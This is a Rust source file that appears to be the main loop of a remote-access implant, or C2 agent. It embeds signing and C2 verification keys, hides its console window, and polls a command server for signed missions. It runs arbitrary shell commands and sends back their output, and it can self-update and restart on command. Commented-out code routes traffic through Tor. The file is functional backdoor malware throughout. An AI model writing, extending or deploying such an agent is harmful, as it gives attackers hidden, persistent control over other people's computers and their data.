#![windows_subsystem = "windows"]
use std::{env, fs, thread, time};

// use arti_client::{TorClient, TorClientConfig};
// use arti_hyper::ArtiHttpConnector;
use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{api, crypto};
use log::{error, info};
// use futures::{Stream, StreamExt};
// use hyper::Body;
// use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
// use tls_api_openssl::TlsConnector;

// #[cfg(debug_assertions)]
// struct MissionStream;

// #[cfg(not(debug_assertions))]
// struct MissionStream {
//     tor_client: TorClient<PreferredRuntime>,
// }

// #[cfg(not(debug_assertions))]
// impl MissionStream {
//     fn new() -> Self {
//         MissionStream {
//             tor_client: TorClient::create_bootstrapped(TorClientConfig::default()),
//         }
//     }
// }

// #[cfg(not(debug_assertions))]
// impl Stream for MissionStream {
//     type Item = Vec<Mission>;

//     fn poll_next(
//         self: std::pin::Pin<&mut Self>,
//         cx: &mut std::task::Context<'_>,
//     ) -> std::task::Poll<Option<Self::Item>> {
//         let http = hyper::Client::new();
//         let mut resp = http.get("localhost:3000".try_into()?).await?;
//         let mut resp = tokio::join!(http.get("localhost:3000".try_into()?));

//         println!("Status: {}", resp.status());
//         let body = hyper::body::to_bytes(resp.body_mut()).await?;
//         println!("Body: {}", std::str::from_utf8(&body)?);
//         cx.waker().wake_by_ref();
//         std::task::Poll::Pending
//     }
// }

// #[tokio::main]
// async fn main() -> anyhow::Result<()> {
//     println!("Starting Arti...");
//     let tor_client = TorClient::create_bootstrapped(TorClientConfig::default()).await?;

//     let tls_connector = TlsConnector::builder()?.build()?;

//     let tor_connector = ArtiHttpConnector::new(tor_client, tls_connector);
//     let http = hyper::Client::builder().build::<_, Body>(tor_connector);

//     println!("Requesting http://icanhazip.com via Tor...");
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     println!("Requesting http://icanhazip.com without Tor...");
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     Ok(())
// }

mod client;
mod error;
#[cfg(unix)]
mod linux;
#[cfg(windows)]
mod windows;

type AgentResult<T> = Result<T, error::AgentError>;

const IDENTITY: &str = "1nlpuul3mNmk9oJ27Usp5Ekfm+MM1CMYBX8FiLTwqd8=";
const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";

fn main() -> AgentResult<()> {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "info");
    }
    env_logger::init();
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
    let agent_path = env::current_exe()?;

    let mut signing_key = crypto::get_signing_key_from(
        BASE64_STANDARD
            .decode(IDENTITY)?
            .as_slice()
            .try_into()
            .unwrap(),
    );
    let c2_verifying_key = crypto::VerifyingKey::from_bytes(
        BASE64_STANDARD
            .decode(C2_VERIFYING_KEY)?
            .as_slice()
            .try_into()
            .unwrap(),
    )
    .unwrap();

    if let Some(mission) = std::env::args().skip(1).next() {
        let mission: api::Mission = serde_json::from_str(&mission)?;
        info!("Agent restarted by mission [{}]", mission.id);
        client::missions::report(&mut signing_key, mission, "OK")?;
    }

    loop {
        match client::missions::get_next(&mut signing_key, &c2_verifying_key) {
            Ok(mission) => {
                if let Some(mission) = mission {
                    match &mission.task {
                        api::Task::Update(data) => {
                            info!("Updating agent '{}'", agent_path.display());
                            let new_agent_path = agent_path.with_file_name("agent.new");
                            fs::write(&new_agent_path, data)?;
                            self_replace::self_replace(&new_agent_path)?;
                            fs::remove_file(&new_agent_path)?;
                            #[cfg(unix)]
                            linux::execute_detached(&agent_path, mission)
                                .expect("Failed to restart the agent");
                            #[cfg(windows)]
                            windows::execute_detached(&agent_path, mission)
                                .expect("Failed to restart the agent");
                            break;
                        }
                        api::Task::Execute(command) => {
                            info!("Executing command: {command}");
                            #[cfg(unix)]
                            let output = linux::execute_cmd(command);
                            #[cfg(windows)]
                            let output = windows::execute_cmd(command);
                            let output = match output {
                                Ok(output) => output.stdout,
                                Err(e) => e.to_string().as_bytes().to_vec(),
                            };
                            client::missions::report(
                                &mut signing_key,
                                mission,
                                &String::from_utf8(output).unwrap(),
                            )?;
                        }
                        api::Task::Stop => {
                            client::missions::report(&mut signing_key, mission, "OK")?;
                            break;
                        }
                    }
                }
            }
            Err(e) => error!("Error: {e}"),
        }
        thread::sleep(time::Duration::from_secs(5));
        // thread::sleep(time::Duration::from_millis(500));
    }
    info!("Stopping agent");
    Ok(())
}
